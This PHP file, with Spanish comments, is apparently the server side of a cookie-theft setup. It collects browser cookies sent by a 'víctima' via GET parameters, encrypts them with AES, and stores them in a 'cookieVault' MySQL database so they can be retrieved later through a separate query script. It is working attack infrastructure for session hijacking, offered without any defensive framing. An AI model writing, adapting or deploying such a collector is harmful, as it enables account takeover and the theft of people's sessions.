<?
/* document.cookie
document.URL   */

// | ID (INT) | DATE (DATE) | URL (URL) | VAR () | VALUE () | PASSWD_sha1

/* Cómo funciona.
ALMACENAMIENTO:
1- La víctima envía la cookie con una passphrase.
2- El servidor recoje la info, encripta los campos URL, VAR y VALUE en SHA1 con
la passphrase, que la guarda hasheada en sha1 en PASSWD_sha1.

CONSULTA:
1- Se le pasa a query.php la URL y la passphrase.
2- Se buscarán todas las coincidencias y se mostrarán todos los campos.
3- El campo ID que identifica una cookie en concreto es opcional, pudiendose
filtrar más adelante.

*/
include 'AES.php';

$blockSize = 256;

class cookie
{

    public $url;
    public $key;
    public $cookie;

    function set_url($url)
    {
        $this->url = $url;
    }

    function set_key($key)
    {
        $this->key = $key;
    }

    function add_data( $data )
    {
        $this->cookie = $data;
    }

    function save( )
    {

        $mysqli = new mysqli('host', 'user', 'password', 'database');
        $date = date ('Y-m-d H:i:s');

        if ($mysqli->connect_error) {
            die('Connect Error (' . $mysqli->connect_errno . ')'
            . $mysqli->connect_error);
        }

        if ($result = $mysqli->query("SELECT id FROM cookieVault WHERE 1 ORDER BY id DESC LIMIT 1")) {
            $i = $result->fetch_array();
            $id = $i[0] + 1;
        } else {
            $id = 0;
        }

        $query = $mysqli->prepare("INSERT INTO cookieVault (id, date, url, data, passwd_sha1) VALUES (?,?,?,?,?)");
        $query->bind_param("dssss", $id, $date, $this->url, $this->cookie, $this->key);

        $query->execute();

        $query->close();
        $mysqli->close();

    }

}

if ( !$_GET["URL"] || !$_GET["COOKIE"] || !$_GET["KEY"] ){
    die ("<h1>Access denied.</h1>");
}

$ck = new cookie;
$ck->set_key ( $_GET["KEY"]."Password2" );
$ck->set_url ( $_GET["URL"] );
$COOKIE = $_GET["COOKIE"];

if ( strlen ($ck->url) > 48 || strlen ($COOKIE) > 4096 || strlen ($ck->key) > 32 ) {
    die ("<h1>Access denied.</h1>");
}

$aes = new AES ( $ck->url, $ck->key, $blockSize );
$ck->set_url ($aes->encrypt());

$aes->setData($COOKIE);
$ck->add_data ($aes->encrypt());

/*
$vars = explode (";", $COOKIE);

for ( $i=0 ; $i < count ($vars) ; $i++ ){
    $cvar = explode ("=", $vars[$i]);

    if ( count($cvar) == 2 ){
        $aes->setData($cvar[0]);
        $var = $aes->encrypt();

        $aes->setData($cvar[1]);
        $value = $aes->encrypt();

        $ck->add_var ( $var, $value );
    }

}
*/

$aes->setData($ck->key);
$ck->set_key ( $aes->encrypt() );

$ck->save();
echo "200";
?>
